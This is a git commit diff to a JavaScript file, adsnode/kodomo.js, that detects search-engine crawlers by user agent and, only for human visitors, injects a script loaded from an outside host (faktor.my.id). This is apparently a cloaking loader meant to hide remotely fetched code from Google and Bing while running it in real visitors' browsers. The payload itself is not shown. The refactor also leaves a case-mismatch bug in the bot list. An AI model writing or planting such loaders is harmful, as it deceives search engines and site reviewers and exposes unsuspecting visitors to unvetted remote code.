ad3a88d72602d322fce949d31aa09633c0ea0111
oonbeh <oonbeh@gmail.com>
2023-02-20 18:21:41 +0800

    Update kodomo.js

--- adsnode/kodomo.js
+++ adsnode/kodomo.js
@@ -1,13 +1,26 @@
+ 
 function isBot() {
-    if (navigator.userAgent) {
-        if (/bot|google\.com|Googlebot|Googlebot-Image|Googlebot-Image\/1\.0|Google|google|bingbot/i.test(navigator.userAgent)) {
-            return true;
-        }
-    }
-    return false;
+var bots = [
+"google.com",
+"Googlebot",
+"Googlebot-Image",
+"Googlebot-Image/1.0",
+"Google",
+"google",
+"bingbot"
+];
+var agent = navigator.userAgent.toLowerCase();
+for (var i = 0; i < bots.length; i++) {
+if (agent.indexOf(bots[i]) != -1) {
+return true;
+}
+}
+return false;
 }
 
 if (!isBot()) {
-var script = document.createElement('script');
+var script = document.createElement("script");
 script.src = "https://faktor.my.id/adsnode/app.js";
-document.head.appendChild(script);
+document.body.appendChild(script);
+}
+
